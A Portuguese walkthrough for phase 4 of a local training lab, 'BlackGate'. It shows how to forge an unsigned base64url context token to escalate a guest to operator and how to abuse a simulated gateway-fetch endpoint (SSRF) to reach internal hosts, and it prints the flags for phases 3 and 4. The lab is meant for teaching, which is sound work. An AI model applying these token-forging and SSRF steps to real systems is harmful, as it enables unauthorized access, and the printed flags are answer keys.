# Lab 05 - BlackGate - Walkthrough da Fase 4

Este walkthrough cobre a **Fase 4 — Gateway Trust / SSRF Setup** do Lab 05. A aplicação ainda não implementa file read, command injection, worker, upload ou admin final.

## Como subir

```bash
cd lab-05-blackgate
docker compose up --build
```

Acesse:

```text
http://localhost:8096
```

## Validação de saúde

Abra:

```text
http://localhost:8096/health
```

Resultado esperado:

```json
{
  "service": "blackgate",
  "status": "ok",
  "version": "1.3.0-phase4"
}
```

## Login

Abra `http://localhost:8096` e faça login com:

```text
guest / guest123
```

Resultado esperado:

- login bem-sucedido;
- redirecionamento para `/dashboard`;
- topo com usuário, role e link de logout.

## Recon e contexto operator

Confirme os endpoints públicos:

```text
/robots.txt
/.well-known/security.txt
/api/status
/api/version
/api/client-config
/api/routes
/debug/ping
```

Com o header abaixo, `/debug/ping` revela metadados limitados de contexto e gateway:

```text
X-Debug-Token: guest-debug
```

Abra `/context`, obtenha `/api/context/me`, decodifique o token base64url e gere um contexto operator:

```bash
TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

Valide:

```text
POST /api/context/verify
Header: X-BG-Context: <TOKEN>
```

## Fase 3 ainda funcional

Use:

```text
GET /api/operator/briefing
Header: X-BG-Context: <TOKEN>
```

Resultado esperado:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

## Gateway metadata

Com o mesmo token, acesse:

```text
/api/operator/gateway-metadata
```

Observe:

- `gateway_fetch`;
- `allowed_internal_hosts`;
- `trusted_upstream`;
- `phase4_hint`.

Esse endpoint não contém a flag da Fase 4. Ele mostra como consultar upstreams internos pelo gateway.

## Gateway fetch controlado

Teste primeiro health:

```text
/api/operator/gateway-fetch?url=http://api-core.internal/health
```

Resultado esperado:

```json
{
  "gateway": "gw-blackgate.local",
  "requested_url": "http://api-core.internal/health",
  "allowed": true,
  "upstream_status": 200,
  "response": {
    "service": "api-core",
    "status": "ok",
    "network": "internal"
  }
}
```

Em seguida enumere rotas:

```text
/api/operator/gateway-fetch?url=http://api-core.internal/routes
```

Depois consulte metadata:

```text
/api/operator/gateway-fetch?url=http://api-core.internal/metadata
```

Resultado esperado:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

Essa é uma simulação segura de SSRF/gateway trust. O servidor não faz request real para rede externa; ele resolve apenas hosts internos permitidos em memória.

## Files-vault para Fase 5

Consulte:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/metadata
```

Observe:

- `storage_mode`;
- `safe_paths`;
- `restricted_paths`;
- `next_hint`.

Isso prepara a Fase 5, mas ainda não implementa leitura de arquivo.

## Bloqueios esperados

Host externo:

```text
/api/operator/gateway-fetch?url=http://example.com
```

Resultado esperado:

```json
{
  "error": "blocked_upstream",
  "message": "Only internal BlackGate upstreams are reachable from this training gateway."
}
```

Path interno inexistente:

```text
/api/operator/gateway-fetch?url=http://api-core.internal/nope
```

Resultado esperado:

```json
{
  "error": "upstream_not_found",
  "message": "Internal upstream route not found."
}
```

Sem token de contexto:

```json
{
  "error": "bad_request",
  "message": "Context token is required."
}
```

## O que deve ficar para fases futuras

A Fase 4 não implementa leitura real de arquivos, path traversal, command injection, upload, fila, Redis, worker, flag final ou exploração de admin.

Ela prepara o terreno para **Fase 5 — Files Vault / Controlled File Read**.
